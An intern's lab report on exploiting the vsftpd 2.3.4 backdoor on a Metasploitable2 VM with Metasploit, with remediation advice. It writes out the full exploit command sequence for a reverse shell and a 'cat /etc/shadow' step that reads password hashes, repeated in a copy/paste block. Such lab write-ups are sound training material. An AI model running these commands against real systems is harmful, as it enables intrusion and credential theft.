# Exploitation with Metasploit — Internship Task

**Date:** 2025-10-18
**Author:** Aman Jiwani (intern)
**Target / Lab:** Metasploitable2 (192.168.56.104)
**Scope:** Exploit a known vulnerability, obtain a reverse shell, and run post‑exploitation commands to gather system information and password hashes. Performed in a controlled lab environment.

---

## Executive summary

This lab demonstrates exploitation of a known backdoor in `vsftpd 2.3.4` on the Metasploitable2 target using the Metasploit Framework. The exploit spawned a reverse/interactive shell. With root privileges, basic system information was collected and the `/etc/shadow` file was inspected as proof of access.

**Impact (lab):** Full compromise of the Metasploitable2 VM (root shell obtained).

**Recommendation (summary):** Patch or remove vulnerable services, restrict network exposure, and follow incident response procedures if this were a production system.

---

## Methodology

Phases followed:

1. Recon & scanning — identify vulnerable service/version (nmap).
2. Exploitation — select and configure Metasploit module.
3. Post‑exploitation — gather sysinfo-equivalent details and dump password hashes (lab proof only).
4. Reporting — document findings and remediation.

---

## Tools used

* `nmap` — service/version discovery
* `msfconsole` (Metasploit Framework) — exploit and session handling
* Standard system commands on compromised host: `id`, `uname -a`, `hostname`, `uptime`, `cat /etc/shadow`

---

## Exploitation steps (commands used)

**Metasploit: configure and run the exploit**

```text
# start msfconsole
msfconsole

# select module
use exploit/unix/ftp/vsftpd_234_backdoor

# configure target and listener
set RHOST 192.168.56.104
set LHOST 192.168.56.105
set LPORT 4444

# run exploit
exploit
```

**Notes:**

* The `vsftpd_234_backdoor` module targets the backdoor present in vsftpd v2.3.4; it spawns an interactive command shell when successful.

---

## Post‑exploitation (commands & rationale)

**Quick system information (equivalent to `sysinfo`)**

```bash
id
uname -a
hostname
uptime
```

* `id` — verify user and group IDs (shows `uid=0(root)` when root)
* `uname -a` — kernel and OS details
* `hostname` — machine identifier
* `uptime` — system run-time (useful for timeline/context)

**Dump password hashes (equivalent to `hashdump`)**
Because the session has root privileges in this lab, `/etc/shadow` is readable:

```bash
cat /etc/shadow
```

**Evidence & notes:** Capture and save terminal output as evidence (sanitized for reports). Do not exfiltrate real credentials; treat any found secrets as sensitive.

---

## Findings & Risk

* **Vulnerable service:** vsftpd 2.3.4 (backdoor) — **Critical**
* **Impact:** Remote code execution → root shell → potential full system compromise.
* **Evidence:** Metasploit module output, interactive shell session, `id` showing `root`, `/etc/shadow` contents accessible.

---

## Mitigations & Recommendations

1. **Patch or remove the vulnerable service** (upgrade vsftpd or replace with a supported secure alternative).
2. **Network controls:** Block or restrict FTP (port 21) to trusted internal hosts only.
3. **Least privilege:** Run services with minimal privileges and avoid running unnecessary services as root.
4. **Monitoring & alerting:** Detect unusual service banners and unexpected shells/listener activity. Alert on access to sensitive files like `/etc/shadow`.
5. **Incident response (if production):** Isolate affected host, collect forensic evidence, rebuild from a trusted image, rotate credentials, and identify root cause and lateral movement.

---

## Artifacts & commands (copy/paste)

```bash
# msfconsole flow
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.56.104
set LHOST 192.168.56.105
set LPORT 4444
exploit

# post-exploitation verification
id
uname -a
hostname
uptime
cat /etc/shadow
```

---

## Ethical & reporting notes (internship submission)

* Mark this as **lab-only / authorized** in the internship report.
* Include timestamps, the lab target IP, and sanitized output screenshots.
* Redact any real credentials and avoid sharing `/etc/shadow` contents in raw form in public repos.
* If this were a real compromise, follow incident response and legal reporting requirements.

---

*End of Exploitation with Metasploit — internship task.*
